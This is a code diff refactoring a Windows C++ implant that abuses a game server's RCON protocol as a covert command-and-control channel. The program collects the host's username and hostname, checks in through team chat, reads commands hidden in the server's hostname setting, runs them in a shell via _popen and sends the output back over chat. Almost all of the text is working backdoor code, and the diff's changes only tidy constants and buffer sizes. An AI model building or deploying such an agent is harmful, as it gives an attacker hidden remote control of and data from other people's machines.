@@ -7,24 +7,29 @@
 #include <memory>
 #include <stdexcept>
 #include <array>
-
-#define RCON_PASS "changeme"
-#define SERVER_IP "127.0.0.1"
-#define SERVER_PORT 27015
-
 #pragma comment(lib, "ws2_32.lib")
 
+// Agent config
+#define RCON_PASS     "changeme"
+#define SERVER_IP     "127.0.0.1"
+#define SERVER_PORT   27015
+#define SLEEP_SECONDS 5
+
 #define RCON_PACKET(challenge, command) "rcon " + challenge + " " + RCON_PASS + " " + command
+#define RCON_CHALLENGE_OFFSET 14
+#define RCON_CHALLENGE_LENGTH 9
+#define MAX_BUFFER_SIZE       256
+#define UDP_MAX_SIZE          4096
 
 void
 getUserInfo(
-    char* hostname, 
-    char* username
+    OUT char* hostname, 
+    OUT char* username
 )
 {
-    gethostname(hostname, 256);
+    DWORD username_len = MAX_BUFFER_SIZE;
 
-    DWORD username_len = 256;
+    gethostname(hostname, MAX_BUFFER_SIZE);
     GetUserNameA(username, &username_len);
 }
 
@@ -33,7 +38,7 @@ exec(
     const std::string& cmd
 ) 
 {
-    std::array<char, 128> buffer;
+    std::array<char, MAX_BUFFER_SIZE> buffer;
     std::string result;
     std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
     if (!pipe) 
@@ -55,7 +60,7 @@ getRconChallenge(
     SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
 
     const char* command = "getchallenge";
-    char rconCommand[256];
+    char rconCommand[MAX_BUFFER_SIZE];
     sprintf_s(rconCommand, sizeof(rconCommand), "\xFF\xFF\xFF\xFF%s", command);
     int result = sendto(s, rconCommand, (int)strlen(rconCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));
 
@@ -73,7 +78,7 @@ getRconChallenge(
 
     // extract challenge from e.g. A00000000 1574936798 3 90179819134315537 1
     auto challengeResponse = std::string(buffer);
-    return challengeResponse.size() < 23 ? "" : challengeResponse.substr(14, 9);
+    return challengeResponse.size() < 23 ? "" : challengeResponse.substr(RCON_CHALLENGE_OFFSET, RCON_CHALLENGE_LENGTH);
 }
 
 std::string
@@ -87,14 +92,14 @@ getHostnameFromCVARS(
     
     std::string command = RCON_PACKET(challenge, "status");
 
-    char rconCommand[255];
+    char rconCommand[MAX_BUFFER_SIZE] = { 0 };
     sprintf_s(rconCommand, sizeof(rconCommand), "\xFF\xFF\xFF\xFF%s", command.c_str());
 
     // Send RCON command
     sendto(s, rconCommand, (int)strlen(rconCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));
 
     // Receive UDP response
-    char cl_buffer[4096] = { 0 };
+    char cl_buffer[UDP_MAX_SIZE] = { 0 };
     int bytesReceived = recv(s, cl_buffer, sizeof(cl_buffer), 0);
 
     std::istringstream iss(cl_buffer);
@@ -117,7 +122,7 @@ sendSayPacket(
 {
     std::string command = RCON_PACKET(challenge, "say_team " + message);
     std::cout << "[*] Sending RCON command - " << command << std::endl;
-    char rconCommand[1024];
+    char rconCommand[UDP_MAX_SIZE] = { 0 };
     sprintf_s(rconCommand, sizeof(rconCommand), "\xFF\xFF\xFF\xFF%s", command.c_str());
     sendto(s, rconCommand, (int)strlen(rconCommand), 0, (struct sockaddr*)&serverAddress, sizeof(struct sockaddr_in));
 }
@@ -156,11 +161,12 @@ main()
     std::cout << "[*] Received RCON challenge: " << challenge << std::endl;
 
     // Check in to server
-    char hostname[256] = { 0 }; char username[256] = { 0 };
+    char hostname[MAX_BUFFER_SIZE] = { 0 }; 
+    char username[MAX_BUFFER_SIZE] = { 0 };
     getUserInfo(hostname, username);
 
     std::string checkinMessage = "\"[*] New terrorist checked in: " + std::string(username) + "@" + std::string(hostname) + "\"";
-    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
+    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0); 
     sendSayPacket(s, serverAddress, challenge, checkinMessage);
     closesocket(s);
 
@@ -183,7 +189,7 @@ main()
             std::string result = exec(currentCommand);
 
             // Send answer to chat, line by line
-            s = socket(AF_INET, SOCK_DGRAM, 0);
+            s = socket(AF_INET, SOCK_DGRAM, 0); 
             std::istringstream iss(result);
             std::string line;
             while (std::getline(iss, line))
@@ -198,7 +204,7 @@ main()
         }
         
         lastCommand = currentCommand;
-        Sleep(5000);
+        Sleep(SLEEP_SECONDS * 1000);
     }
 
     WSACleanup();
